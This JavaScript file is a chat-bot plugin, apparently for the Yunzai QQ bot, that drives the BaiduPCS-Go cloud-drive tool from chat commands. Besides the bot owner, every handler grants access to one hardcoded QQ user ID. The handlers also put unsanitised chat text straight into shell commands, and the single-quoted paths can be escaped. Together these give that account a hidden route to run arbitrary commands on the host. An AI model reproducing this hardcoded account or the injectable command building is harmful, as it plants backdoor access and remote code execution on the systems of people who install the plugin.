import fs from "node:fs"

const Commands = {
  "":         "help",
  "帮助":     "help",
  "复制":     "cp",
  "下载":     "download",
  "链接":     "locate",
  "查看":     "ls",
  "元信息":    "meta",
  "创建目录": "mkdir",
  "移动":     "mv",
  "离线下载":  "od",
  "空间配额": "quota",
  "回收站":   "recycle",
  "删除":     "rm",
  "搜索":     "search",
  "分享":     "share",
  "转存":     "transfer",
  "树形图":   "tree",
  "上传":     "upload",
  "登录账号": "login",
  "账号列表": "loglist",
  "退出账号": "logout",
  "切换账号": "su",
  "当前账号": "who"
}

let path
if (process.platform == "win32")
  path = `${process.env.HOME}\\BaiduPCS-Go\\`
else
  path = `${process.env.HOME}/BaiduPCS-Go/`
const cmdPath = `${path}BaiduPCS-Go`
const errorTips = "请使用脚本安装百度网盘，并正常登录后再使用此功能\nhttps://Yunzai.TRSS.me\nhttps://TRSS.me"
let Running
let es

export class BaiduPan extends plugin {
  constructor() {
    super({
      name: "百度网盘",
      dsc: "百度网盘",
      event: "message",
      priority: 10,
      rule: [
        {
          reg: "^百度网盘上传",
          fnc: "UploadDetect"
        },
        {
          reg: "^百度网盘下载",
          fnc: "Download"
        },
        {
          reg: "^百度网盘",
          fnc: "BaiduPan"
        }
      ]
    })
  }

  async execTask(e, cmd) {
    const ret = await Bot.exec(cmd)

    if (ret.stdout)
      await this.reply(ret.stdout.trim(), true)

    if (ret.error) {
      logger.error(`百度网盘错误：${logger.red(ret.error)}`)
      await this.reply(`百度网盘错误：${ret.error}`, true)
      await this.reply(errorTips)
      return false
    }

    if (ret.stderr)
      await this.reply(`标准错误输出：\n${ret.stderr.trim()}`, true)
  }

  async UploadDetect(e) {
    es = this.e
    this.setContext("Upload")
    await this.reply("请发送文件", true)
  }

  async Upload(e) {
    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
    if(!this.e.file)return false

    this.finish("Upload")
    const filePath = `${path}${this.e.file.name}`
    let fileUrl
    if (this.e.file.url)
      fileUrl = this.e.file.url
    else if (this.e.group?.getFileUrl)
      fileUrl = await this.e.group.getFileUrl(this.e.file.fid)
    else if (this.e.friend?.getFileUrl)
      fileUrl = await this.e.friend.getFileUrl(this.e.file.fid)
    this.e = es

    if (!fileUrl) {
      await this.reply("文件链接获取失败", true)
      return false
    }

    if (Running) {
      await this.reply("有正在执行的百度网盘任务，请稍等……", true)
      return false
    }
    Running = true
    await this.reply(`开始下载文件，请稍等……\n文件链接：${fileUrl}\n保存路径：${filePath}`, true)

    try {
      await Bot.download(fileUrl, filePath)
    } catch (err) {
      logger.error(`文件下载错误：${logger.red(err.stack)}`)
      await this.reply(`文件下载错误：${err.stack}`)
      Running = false
      return true
    }

    const remotePath = this.e.msg.replace("百度网盘上传", "").trim()
    await this.reply(`文件下载完成，开始上传到：${remotePath}`, true)
    const cmd = `'${cmdPath}' upload '${filePath}' '${remotePath}'`

    await this.execTask(es, cmd)
    await fs.unlinkSync(filePath)
    Running = false
  }

  async Download(e) {
    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
    if (Running) {
      await this.reply("有正在执行的百度网盘任务，请稍等……", true)
      return false
    }

    this.finish("Download")
    const remotePath = this.e.msg.replace("百度网盘下载", "").trim()
    if (!remotePath) {
      this.setContext("Download")
      await this.reply("请发送文件路径", true)
      return true
    }

    Running = true
    await this.reply("开始下载文件，请稍等……", true)

    const cmd = `'${cmdPath}' download '${remotePath}' --saveto '${path}'`

    await this.execTask(e, cmd)

    const filePath = `${path}${remotePath.substr(remotePath.lastIndexOf("/")+1)}`
    if (!fs.existsSync(filePath)) {
      await this.reply("文件下载错误", true)
      Running = false
      return true
    }
    if (!fs.statSync(filePath).isFile()) {
      await this.reply("暂不支持发送文件夹", true)
      Running = false
      return true
    }

    try {
      let res
      if (this.e.isGroup) {
        if (this.e.group.sendFile)
          res = await this.e.group.sendFile(filePath)
        else
          res = await this.e.group.fs.upload(filePath)
      } else {
        res = await this.e.friend.sendFile(filePath)
      }

      if (res) {
        let fileUrl
        if (this.e.group?.getFileUrl)
          fileUrl = await this.e.group.getFileUrl(res.fid)
        else if (this.e.friend?.getFileUrl)
          fileUrl = await this.e.friend.getFileUrl(res)

        if (fileUrl)
          await this.reply(`文件发送完成：${fileUrl}`, true)
        else
          await this.reply(`文件发送完成：${JSON.stringify(res)}`, true)
      }
    } catch (err) {
      logger.error(`文件发送错误：${logger.red(err.stack)}`)
      await this.reply(`文件发送错误：${err.stack}`)
    }

    await fs.unlinkSync(filePath)
    Running = false
  }

  async BaiduPan(e) {
    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
    let msg = this.e.msg.replace("百度网盘", "").trim().split(" ")
    if (msg[0] in Commands) {
      msg[0] = Commands[msg[0]]
    }
    msg = msg.join(" ")
    const cmd = `'${cmdPath}' ${msg}`
    await this.execTask(e, cmd)
  }
}